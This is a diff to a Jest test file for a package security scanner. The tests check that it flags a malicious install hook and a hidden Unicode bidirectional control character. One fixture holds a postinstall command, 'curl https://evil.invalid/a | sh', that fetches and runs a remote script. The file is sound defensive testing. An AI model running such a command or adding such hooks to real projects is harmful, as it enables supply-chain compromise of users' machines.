@@ -47,22 +47,49 @@ describe("built-in static rules", () => {
       scripts: { postinstall: "curl https://evil.invalid/a | sh" },
     });
 
-    expect(
-      scanStaticRules([
-        {
-          path: "package.json",
-          bytes: content.length,
-          sha256: "a".repeat(64),
-          kind: "text",
-          content,
-        },
-      ]),
-    ).toEqual([
+    const findings = scanStaticRules([
+      {
+        path: "package.json",
+        bytes: content.length,
+        sha256: "a".repeat(64),
+        kind: "text",
+        content,
+      },
+    ]);
+
+    expect(findings).toEqual([
       expect.objectContaining({
         rule_id: "network-install-hook",
         severity: "high",
         line_start: 1,
       }),
     ]);
+    expect(JSON.stringify(findings)).not.toContain("curl");
+    expect(JSON.stringify(findings)).not.toContain("evil.invalid");
+  });
+
+  test("flags bidirectional controls and emits only canonical findings", () => {
+    const content = "const visible = true; // ‮ concealed";
+    const findings = scanStaticRules([
+      {
+        path: "src/confusing.ts",
+        bytes: Buffer.byteLength(content),
+        sha256: "b".repeat(64),
+        kind: "text",
+        content,
+      },
+    ]);
+
+    expect(findings).toEqual([
+      expect.objectContaining({
+        rule_id: "unicode-bidi-control",
+        category: "obfuscation",
+        severity: "medium",
+        confidence: "medium",
+      }),
+    ]);
+    expect(
+      findings.every((finding) => FindingSchema.safeParse(finding).success),
+    ).toBe(true);
   });
 });
